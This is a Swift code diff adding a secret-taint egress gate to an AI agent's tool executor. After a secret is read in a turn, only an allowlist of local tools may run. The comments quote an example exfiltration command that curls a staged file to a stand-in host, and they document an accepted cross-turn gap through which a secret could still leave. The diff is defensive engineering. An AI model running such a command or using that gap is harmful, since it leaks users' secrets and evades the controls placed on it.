@@ -234,7 +234,21 @@ actor ToolExecutor: ToolExecutorProtocol {
     /// routed Host bash in that same turn carries `network_denied: true` so the
     /// daemon runs it network-denied + workspace-write-only — the secret the
     /// model just read (in context, or staged to /tmp) cannot be exfiltrated by a
-    /// later split call (`curl -d @/tmp/x evil`) in the same turn.
+    /// later split call (`curl -d @/tmp/x evil`) in the same turn. Every OTHER
+    /// tool in the tainted turn passes the default-deny egress gate below
+    /// (`localSafeToolsAfterSecretRead`) — bash is the only egress-capable tool
+    /// allowed through, because it is the one the daemon network-confines.
+    ///
+    /// ACCEPTED CROSS-TURN RESIDUAL (documented, not fixed): the taint is
+    /// TURN-scoped. A secret that entered the conversation context (or was
+    /// staged into a workspace file, which tainted bash/write still permit)
+    /// persists into a NEW turn, where the taint is clear and egress tools are
+    /// allowed again. The primary control is the informed-consent card (L12):
+    /// the user knowingly exposed that secret to the model; Secrets grants are
+    /// never persistent ("always" is refused), every override is audited, and
+    /// the exposure window is one authorization. Closing the cross-turn hole
+    /// would require conversation-scoped secret tracking/redaction, which is
+    /// out of scope for the turn-taint mechanism.
     private var secretTaintTurnID: String?
     /// Taint raised on a turn WITHOUT a workflow turn id. With no id to compare,
     /// the taint cannot prove a new turn started, so it holds (fail closed) until
@@ -269,6 +283,29 @@ actor ToolExecutor: ToolExecutorProtocol {
         guard let current = currentTurnID else { return true }
         return current == tainted
     }
+
+    /// The ONLY tools allowed in a secret-tainted turn (besides `bash`, which is
+    /// allowed because the daemon network-confines it via `network_denied`).
+    ///
+    /// This is a default-deny ALLOWLIST, deliberately not a denylist: any tool
+    /// NOT here is denied after a secret read, so a future tool cannot silently
+    /// become an exfil path (the same fail-safe principle as the L1 origin
+    /// inversion). Add a tool here ONLY if it provably cannot transmit data off
+    /// the machine. Everything with network reach, message sending, agent
+    /// delegation, arbitrary code execution, UI driving (a browser can be typed
+    /// into), or cloud-synced state (Apple calendar/contacts/notes/reminders/
+    /// mail sync through iCloud/servers) stays denied.
+    static let localSafeToolsAfterSecretRead: Set<String> = [
+        // Local file IO — workspace-confined by the daemon routing layer.
+        "read", "write", "edit",
+        // Local database / config surfaces.
+        "session_search", "self_config",
+        // Local scheduler CRUD (scheduler.db).
+        "scheduler_list", "scheduler_create", "scheduler_update",
+        "scheduler_delete", "scheduler_trigger",
+        // Local task tracking / user-facing prompts / persona / window moves.
+        "till_done", "input_request", "roleplay", "window_control",
+    ]
 
     /// The truthful daemon origin for a tool call's context (L1 — also closes gap
     /// #38). FAIL-SAFE INVERTED: `owner_interactive` is granted ONLY on the
@@ -521,6 +558,42 @@ actor ToolExecutor: ToolExecutorProtocol {
                 result: .error("Unknown tool: \(call.name)"),
                 approvedByUser: nil,
                 damageControlIntervened: false,
+                latencyMs: nil
+            )
+        }
+
+        // ── 6a. Secret-taint egress gate (FLAW-1 extension, default-deny) ──
+        // After an approved Secrets-tier read this turn, the secret is in model
+        // context — ANY egress-capable tool (fetch_url, web_search, mail,
+        // delegate_agent, run_skill, show_html, computer-use typing into a
+        // browser, iCloud-synced Apple tools, …) could exfiltrate it. Only the
+        // explicit local-safe allowlist passes; `bash` passes because the daemon
+        // network-confines it via `network_denied` (the original FLAW-1 fix).
+        // Runs BEFORE the daemon-routing switch so routed tools are covered too.
+        if call.name != "bash",
+           !Self.localSafeToolsAfterSecretRead.contains(call.name),
+           isSecretReadTainted(currentTurnID: context.workflowTurnID)
+        {
+            await securityLogger.log(
+                event: "secret_taint_egress_denied",
+                toolName: call.name,
+                decision: "deny",
+                reasonCode: "secretReadTaintEgress",
+                approved: nil,
+                success: nil,
+                error: nil,
+                arguments: call.arguments
+            )
+            debugLog(
+                debugConsole, .approval,
+                "Secret-taint egress gate denied \(call.name) (tainted turn)")
+            return ToolExecutorResult(
+                result: .error(
+                    "For your security, after reading a protected secret this turn "
+                    + "I can't take actions that could send data off this machine "
+                    + "(\(call.name)). Start a new request if you need that."),
+                approvedByUser: nil,
+                damageControlIntervened: true,
                 latencyMs: nil
             )
         }
